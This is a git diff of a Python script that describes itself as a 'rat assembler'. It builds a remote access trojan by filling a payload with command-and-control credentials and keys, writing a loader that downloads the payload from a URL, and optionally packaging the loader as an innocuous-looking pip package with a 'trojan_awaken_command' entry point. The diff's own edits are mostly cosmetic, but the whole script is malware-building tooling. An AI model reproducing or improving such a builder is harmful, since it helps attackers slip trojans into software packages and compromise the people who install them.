@@ -1,8 +1,9 @@
 import argparse
 from pathlib import Path
-import platform 
+import platform
 import secrets
-import base64 
+import base64
+
 
 def building_args():
     parser = argparse.ArgumentParser(description="vengeancet rat assembler")
@@ -16,7 +17,7 @@ def building_args():
 
 
 def create_pip_package(output_name: str, loader_code: str):
-    print("configure the malicosos package")
+    print("configure the malicious package")
     name = input("package name: ").strip()
     description = input("package description: ").strip()
     version = input("package version: ").strip()
@@ -50,20 +51,20 @@ license = {{text = "GPL-3.0-or-later"}}
 where = ["src"]
 """)
 
-    
+
     with init.open("w", encoding="utf-8") as f:
         f.write(f'__version__ = "{version}"\n')
 
-    
-    print(f"\nPacote criado em: {pip_package_folder}")
-    print("Para instalar em modo editável:")
+
+    print(f"\nPackage created at: {pip_package_folder}")
+    print("To install in editable mode:")
     print(f"    pip install -e {pip_package_folder}")
-    print("Para gerar wheel/sdist:")
+    print("To build wheel/sdist:")
     print(f"    python -m build {pip_package_folder}")
 
 
     with loader.write("w",encoding="utf-8") as f:
-        f.write(loader_code) 
+        f.write(loader_code)
     with pyproject.open("w",encoding="utf-8") as f:
         pyproject_content = f"""
         [build-system]
@@ -76,8 +77,8 @@ where = ["src"]
         version = "{version}"
         requires-python = ">=3.10"
 
-        [project.scripts] 
-        {trojan_awaken_command} = {output_name}.core:main 
+        [project.scripts]
+        {trojan_awaken_command} = {output_name}.core:main
 
         """
         f.write(pyproject_content)
@@ -102,7 +103,7 @@ def main(token:str,
 
     payload_template_code = template_payload.read_text()
     loader_template_code = template_loader.read_text()
-     
+
     configure_c2 = f"""
 token = "{token}"
 c2_group_id = "{group_id}"
@@ -111,16 +112,18 @@ key = "{secrets.token_hex(32)}"
 """
 
     configure_loader = f'url = "{payload_url}"\n'
-    
+
     with payload.open("w",encoding="utf-8") as f:
         f.write(f"{configure_c2}{payload_template_code}")
     with loader.open("w",encoding="utf-8") as f:
         f.write(f"{configure_loader}{loader_template_code}")
-    
+
     if pip_distribuition == True:
         create_pip_package(output_folder,loader.read_text())
 
-if __name__ == "__main__":  
+if __name__ == "__main__":
+    ascii_art = open("./assets/banner.txt").read()
+    print(ascii_art)
     args = building_args()
 
     main(args.token,
@@ -128,5 +131,4 @@ if __name__ == "__main__":
     args.owner_id,
     args.output,
     args.payload_url_dowload,
-    args.pip_distribuition) 
-
+    args.pip_distribuition)
